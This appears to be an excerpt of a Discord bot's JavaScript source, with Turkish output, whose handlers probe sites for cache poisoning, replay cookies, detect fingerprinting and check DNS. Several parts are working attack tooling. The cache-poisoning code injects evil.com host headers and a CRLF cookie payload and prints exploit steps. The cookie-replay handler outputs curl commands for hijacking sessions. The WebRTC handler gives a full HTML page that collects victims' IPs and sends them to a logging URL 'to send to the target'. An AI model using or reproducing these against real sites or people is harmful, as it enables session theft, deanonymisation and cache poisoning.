							{ h: 'evil.com/v2/api', d: 'Path manipule' },
							{ h: 'evil.com%0d%0aSet-Cookie:poison=stolen', d: 'CRLF + Cookie' },
						];

						let isVulnerable = false;
						for (const ph of poisonedHosts) {
							try {
								const r = await safeFetch(base, {
									headers: {
										'User-Agent': 'Mozilla/5.0',
										'X-Forwarded-Host': ph.h,
										'X-Forwarded-For': '127.0.0.1',
										'X-Original-URL': '/admin',
									},
									redirect: 'manual'
								}, 5000);
								const body = await r.text().catch(() => '');
								if (body.includes(ph.h) || body.includes('evil.com')) {
									result += `  [KRITIK] ${ph.d}: X-Forwarded-Host yansidi!${nl}`;
									isVulnerable = true;
								} else {
									result += `  ${ph.d}: [OK] Yansimadi${nl}`;
								}
							} catch (e) { result += `  ${ph.d}: Hata${nl}`; }
						}

						if (isVulnerable) {
							result += `${nl}**3. Cache Poisoning Exploit:**${nl}`;
							result += `  1. Saldirgan X-Forwarded-Host ile cache'i zehirler:${nl}`;
							result += `     curl -H "X-Forwarded-Host: evil.com" ${base}/static/script.js${nl}`;
							result += `  2. Cache'e zehirli response kaydedilir${nl}`;
							result += `  3. Sonraki kullanicilar zehirli icerigi gorur${nl}`;
							result += `  4. Zehirli JS cookie'leri evil.com'a gonderir${nl}`;
						}

						result += `${nl}**4. Diger Cache Poisoning Vektorleri:**${nl}`;
						result += `  - X-Forwarded-For: 127.0.0.1${nl}`;
						result += `  - X-Forwarded-Scheme: http${nl}`;
						result += `  - X-Original-URL: /admin${nl}`;
						result += `  - X-Rewrite-URL: /evil${nl}`;
						result += `  - Accept-Encoding manipulation${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Cache zehirleme hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== C O O K I E   R E P L A Y ====================
			case 'cookie-replay':
				ctx.waitUntil((async () => {
					try {
						const cookie = getOption('cookie');
						let result = `**Cookie Replay Saldirisi Analizi:**${nl}${nl}`;
						if (!cookie) {
							result += `[HATA] Cookie parametresi gerekli. Ornek: 'cookie-replay cookie:"session=abc123; user=admin"'${nl}`;
							await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
							return;
						}

						result += `**1. Cookie Parse:**${nl}`;
						const pairs = cookie.split(';').map(p => p.trim()).filter(Boolean);
						pairs.forEach(p => {
							const [key, ...valParts] = p.split('=');
							const val = valParts.join('=');
							result += `  ${key}: ${val ? val.slice(0, 50) : '(bos)'}${nl}`;
						});

						result += `${nl}**2. Token Formati Analizi:**${nl}`;
						pairs.forEach(p => {
							const [key, val] = p.split('=');
							if (!val) return;
							if (val.startsWith('eyJ')) {
								result += `  ${key}: JWT formatinda${nl}`;
								try {
									const parts = val.split('.');
									const payload = JSON.parse(_atob(parts[1]));
									const exp = payload.exp ? new Date(payload.exp * 1000).toISOString() : 'yok';
									result += `    Payload: ${JSON.stringify(payload).slice(0, 150)}${nl}`;
									result += `    Expires: ${exp}${nl}`;
									if (payload.exp && Date.now() > payload.exp * 1000) {
										result += `    [UYARI] Token suresi dolmus!${nl}`;
									}
								} catch (e) { result += `    JWT decode basarisiz.${nl}`; }
							} else if (/^[a-f0-9]{32,}$/i.test(val)) {
								result += `  ${key}: MD5/SHA hex formati (32+ hex)${nl}`;
							} else if (/^[A-Za-z0-9+/=]{20,}$/.test(val)) {
								result += `  ${key}: Base64 encoded${nl}`;
							} else if (/^\d+$/.test(val)) {
								result += `  ${key}: Numerik ID${nl}`;
							} else {
								result += `  ${key}: Random/metin formatinda${nl}`;
							}
						});

						result += `${nl}**3. Replay (Curl) Komutlari:**${nl}`;
						result += `  ${bt}curl -H "Cookie: ${cookie}" https://<target-url>${bt}${nl}`;
						result += `  ${bt}curl -b "${cookie}" https://<target-url>/api/user${bt}${nl}`;
						result += `  ${bt}curl -H "Cookie: ${cookie.slice(0, 50)}..." -v https://<target-url>${bt}${nl}`;

						result += `${nl}**4. Zaman Bazli Session Testi:**${nl}`;
						result += `  1. Cookie'yi her 5 dakikada bir dene${nl}`;
						result += `  2. while true; do curl -b "${cookie.slice(0, 30)}..." https://target -o /dev/null -w "%{http_code}\n"; sleep 300; done${nl}`;
						result += `  3. Session zamani tespit edilince slayt zamanlamasi ayarla${nl}`;
						result += `  4. Refresh token varsa session yenileme dene${nl}`;

						result += `${nl}**5. Guvenlik Onlemleri:**${nl}`;
						result += `  - Absolute session timeout (max session yasi)${nl}`;
						result += `  - Idle session timeout (kullanilmayan session)${nl}`;
						result += `  - IP degisiminde session invalidation${nl}`;
						result += `  - User-Agent degisiminde session kill${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Cookie replay hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== B R O W S E R   F I N G E R ====================
			case 'browser-finger':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Browser Fingerprinting Analizi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. Sayfa Fetch & Analiz:**${nl}`;
						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 10000);
						const html = await res.text().catch(() => '');

						result += `**2. Parmak Izi Kutuphaneleri:**${nl}`;
						const libs = [
							{ p: 'fingerprintjs', d: 'FingerprintJS (commercial)' },
							{ p: 'fingerprint2', d: 'FingerprintJS v2 (legacy)' },
							{ p: 'clientjs', d: 'ClientJS' },
							{ p: 'fp.js', d: 'fp.js' },
							{ p: 'fingerprinting', d: 'Generic fingerprinting' },
							{ p: 'getFingerprint', d: 'getFingerprint function' },
							{ p: 'canvasHash', d: 'Canvas hash' },
							{ p: 'webglFingerprint', d: 'WebGL fingerprint' },
							{ p: 'audioFingerprint', d: 'AudioContext fingerprint' },
							{ p: 'fontFingerprint', d: 'Font fingerprint' },
						];

						let libsFound = 0;
						for (const lib of libs) {
							if (html.toLowerCase().includes(lib.p.toLowerCase())) {
								result += `  [BULUNDU] ${lib.p} - ${lib.d}${nl}`;
								libsFound++;
							}
						}
						if (libsFound === 0) result += `  [OK] Bilinen fingerprint kutuphanesi bulunamadi.${nl}`;

						result += `${nl}**3. Canvas Fingerprint Pattern'leri:**${nl}`;
						const fpPatterns = [
							{ p: /canvas\.getContext\s*\(\s*['"`]2d['"`]/i, d: 'Canvas 2D context' },
							{ p: /toDataURL\s*\(/i, d: 'Canvas toDataURL()' },
							{ p: /fillText\s*\(/i, d: 'Canvas fillText()' },
							{ p: /measureText\s*\(/i, d: 'Canvas measureText()' },
							{ p: /getImageData\s*\(/i, d: 'Canvas getImageData()' },
							{ p: /OffscreenCanvas/i, d: 'OffscreenCanvas API' },
						];
						let canvasFound = 0;
						for (const pat of fpPatterns) {
							if (pat.p.test(html)) {
								result += `  ${pat.d} tespit edildi${nl}`;
								canvasFound++;
							}
						}
						if (canvasFound === 0) result += `  Canvas fingerprint pattern bulunamadi.${nl}`;

						result += `${nl}**4. WebGL Fingerprint:**${nl}`;
						const webglPatterns = [
							{ p: /WEBGL_debug_renderer_info/i, d: 'WebGL debug renderer' },
							{ p: /getParameter\s*\(\s*.*RENDERER/i, d: 'GPU renderer okuma' },
							{ p: /getExtension\s*\(\s*['"`]WEBGL/i, d: 'WebGL extension' },
							{ p: /webgl\.createBuffer/i, d: 'WebGL buffer' },
						];
						let webglFound = 0;
						for (const pat of webglPatterns) {
							if (pat.p.test(html)) { webglFound++; result += `  ${pat.d}${nl}`; }
						}
						if (webglFound === 0) result += `  WebGL fingerprint pattern bulunamadi.${nl}`;

						result += `${nl}**5. Audio Fingerprint:**${nl}`;
						const audioPatterns = [
							{ p: /AudioContext/i, d: 'AudioContext API' },
							{ p: /createOscillator/i, d: 'Oscillator node' },
							{ p: /createDynamicsCompressor/i, d: 'Compressor node' },
							{ p: /getChannelData/i, d: 'Audio channel data' },
						];
						let audioFound = 0;
						for (const pat of audioPatterns) {
							if (pat.p.test(html)) { audioFound++; result += `  ${pat.d}${nl}`; }
						}
						if (audioFound === 0) result += `  Audio fingerprint pattern bulunamadi.${nl}`;

						result += `${nl}**6. Diger Izleme Teknikleri:**${nl}`;
						const otherPatterns = [
							{ p: /navigator\.userAgent/i, d: 'User-Agent sniffing' },
							{ p: /navigator\.language/i, d: 'Language detection' },
							{ p: /navigator\.platform/i, d: 'Platform detection' },
							{ p: /navigator\.hardwareConcurrency/i, d: 'CPU core count' },
							{ p: /navigator\.deviceMemory/i, d: 'Device memory' },
							{ p: /screen\.(width|height|colorDepth)/i, d: 'Screen info' },
							{ p: /timezoneOffset/i, d: 'Timezone detection' },
							{ p: /installedFonts/i, d: 'Font detection' },
							{ p: /cookieEnabled/i, d: 'Cookie enabled check' },
						];
						let otherFound = 0;
						for (const pat of otherPatterns) {
							if (pat.p.test(html)) { otherFound++; result += `  ${pat.d}${nl}`; }
						}
						if (otherFound === 0) result += `  Diger izleme pattern bulunamadi.${nl}`;

						result += `${nl}**7. Etki Analizi:**${nl}`;
						result += `  - Browser fingerprint cookie'siz takip saglar${nl}`;
						result += `  - Incognito modda bile benzersiz kimlik olusturur${nl}`;
						result += `  - Cookie'ler silinse bile kullanici taninir${nl}`;
						result += `  - GDPR/CCPA ihlalleri olusabilir${nl}`;
						const total = canvasFound + webglFound + audioFound + otherFound + libsFound;
						if (total > 0) {
							result += `${nl}  [UYARI] Toplam ${total} fingerprint indikatoru bulundu!${nl}`;
						} else {
							result += `${nl}  [OK] Sayfada fingerprinting tespit edilemedi.${nl}`;
						}

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Browser finger hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== W E B R T C   S I Z D I R ====================
			case 'webrtc-sizdir':
				ctx.waitUntil((async () => {
					try {
						let result = `**WebRTC IP Sizdirma Testi**${nl}${nl}`;

						result += `**WebRTC Nedir?**${nl}`;
						result += `WebRTC (Web Real-Time Communication), tarayicilarin P2P baglanti kurmasini saglar.${nl}`;
						result += `VPN bagli olsaniz bile WebRTC STUN istekleri GERCEK IP'nizi sizdirabilir.${nl}${nl}`;

						result += `**Sizdirma Testi (Kendiniz Deneyin):**${nl}`;
						result += `  1. VPN'inizi acin${nl}`;
						result += `  2. Su siteye gidin: https://browserleaks.com/webrtc${nl}`;
						result += `  3. "Public IP" altinda VPN IP'sini goreceksiniz${nl}`;
						result += `  4. Eger "Private IP" altinda 192.168.x.x veya 10.x.x.x gorurseniz -> GERCEK IP SIZDI!${nl}${nl}`;

						result += `**Alternatif WebRTC Test Siteleri:**${nl}`;
						const leakSites = [
							'https://ipleak.net',
							'https://browserleaks.com/webrtc',
							'https://www.doileak.com',
							'https://whoer.net',
							'https://ipx.ac/run',
						];
						leakSites.forEach(s => result += `  - ${s}${nl}`);

						result += `${nl}**WebRTC IP Sizdirma HTML Sayfasi:**${nl}`;
						result += `Asagidaki HTML dosyasini bir web sunucusuna koyup hedefe gonderin:${nl}`;
						result += `\`\`\`html${nl}<!DOCTYPE html><html><body>${nl}<h1>Yukleniyor...</h1>${nl}<script>${nl}var ips=[];${nl}var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});${nl}pc.createDataChannel("");${nl}pc.createOffer().then(o=>pc.setLocalDescription(o));${nl}pc.onicecandidate=e=>{${nl}  if(!e.candidate) return;${nl}  var ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);${nl}  if(ip && ips.indexOf(ip[0])===-1){${nl}    ips.push(ip[0]);${nl}    fetch('LOG_URL?ip='+ip[0]);${nl}    document.body.innerHTML+='<p>IP: '+ip[0]+'</p>';${nl}  }${nl}};${nl}</script></body></html>${nl}\`\`\`${nl}`;

						result += `${nl}**Tarayici Cozumu (WebRTC Kapatma):**${nl}`;
						result += `  Chrome: chrome://flags/#disable-webrtc -> Disable${nl}`;
						result += `  Firefox: about:config -> media.peerconnection.enabled -> false${nl}`;
						result += `  Brave: Ayarlar -> WebRTC -> Disable${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `WebRTC hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== D N S   K A C A K ====================
			case 'dns-kacak':
				ctx.waitUntil((async () => {
					try {
						const domain = getOption('domain') || '';
						let result = `**DNS Kacak Testi**${nl}${nl}`;

						result += `**DNS Leak Nedir?**${nl}`;
						result += `VPN kullanirken DNS sorgulariniz VPN tunelinden degil,${nl}`;
						result += `ISS'nizin DNS sunucusundan gidebilir. Bu da GERCEK IP ve konumunuzu ifsa eder.${nl}${nl}`;

						if (domain) {
							result += `**Hedef Domain: ${domain}**${nl}${nl}`;

							result += `**1. DNS Cozumleme:**${nl}`;
							try {
								const ac = new AbortController(); setTimeout(() => ac.abort(), 5000);
								const dnsRes = await fetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=A`, {
									headers: { 'accept': 'application/dns-json' },
									signal: ac.signal
								});
								if (dnsRes.ok) {
									const dns = await dnsRes.json();
									if (dns.Answer) {
										dns.Answer.forEach(a => result += `  A: ${a.data} (TTL: ${a.TTL || '?'}s)${nl}`);
									}
								}
							} catch (e) { result += `  Cozumlenemedi${nl}`; }

							result += `${nl}**2. Farkli DNS Sunuculariyla Cozum:**${nl}`;
							const resolvers = [
								['Cloudflare', '1.1.1.1'],
								['Google', '8.8.8.8'],
								['Quad9', '9.9.9.9'],
								['OpenDNS', '208.67.222.222'],
							];
							for (const [name, ip] of resolvers) {
								try {
									const ac = new AbortController(); setTimeout(() => ac.abort(), 3000);
									const r = await fetch(`https://dns.google/resolve?name=${domain}&type=A`, { signal: ac.signal });
									if (r.ok) {
										const d = await r.json();
										const ips = (d.Answer || []).map(a => a.data).join(', ');
										result += `  ${name}: ${ips || 'Cozumlenemedi'}${nl}`;
									}
								} catch (e) { /* alt */ }
							}

							result += `${nl}**3. DNS Tarihcesi (VT):**${nl}`;
							if (env.VIRUSTOTAL_API_KEY) {
								try {
									const ac = new AbortController(); setTimeout(() => ac.abort(), 5000);
									const vtRes = await fetch(`https://www.virustotal.com/api/v3/domains/${domain}/resolutions?limit=10`, {
										headers: { 'x-apikey': env.VIRUSTOTAL_API_KEY },
										signal: ac.signal
									});
									if (vtRes.ok) {
										const vt = await vtRes.json();
										(vt.data || []).slice(0, 5).forEach(d => {
											result += `  ${d.attributes?.ip_address || '?'} - ${d.attributes?.date ? new Date(d.attributes.date * 1000).toISOString().slice(0,10) : '?'}${nl}`;
										});
									}
								} catch (e) { /* alt */ }
							}

							result += `${nl}**4. DNS Kayit Turleri:**${nl}`;
							for (const t of ['NS', 'MX', 'TXT', 'CNAME', 'SOA']) {
								try {
									const ac = new AbortController(); setTimeout(() => ac.abort(), 3000);
									const r = await fetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=${t}`, {
										headers: { 'accept': 'application/dns-json' },
										signal: ac.signal
									});
									if (r.ok) {
										const d = await r.json();
										if (d.Answer) {
											d.Answer.slice(0, 2).forEach(a => result += `  ${t}: ${a.data}${nl}`);
										}
									}
								} catch (e) { /* alt */ }
							}
						}

						result += `${nl}**DNS Leak Test Araclari:**${nl}`;
						result += `  - https://dnsleaktest.com (En populer)${nl}`;
						result += `  - https://ipleak.net (WebRTC + DNS + IPv6)${nl}`;
						result += `  - https://dnsleak.com${nl}`;
						result += `  - https://www.dnsleaktest.org${nl}${nl}`;

						result += `**DNS Leak Cozumu:**${nl}`;
						result += `  1. VPN DNS sunucularini kullanmak icin VPN ayarlarini kontrol et${nl}`;
						result += `  2. Tarayicida DNS-over-HTTPS (DoH) aktif et${nl}`;
						result += `  3. Sistem DNS'ini 1.1.1.1 veya 8.8.8.8 yap${nl}`;
						result += `  4. IPv6'yi kapat (cogu VPN IPv6 DNS'i yonlendirmez)${nl}`;
						result += `  5. dnscrypt-proxy kullan${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `DNS kacak hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			default:
				return sendResponse('Bilinmeyen komut. Bu bot henuz yapilandiriliyor.');
		}
	}

	return new Response('Bilinmeyen etkilesim', { status: 400 });
}
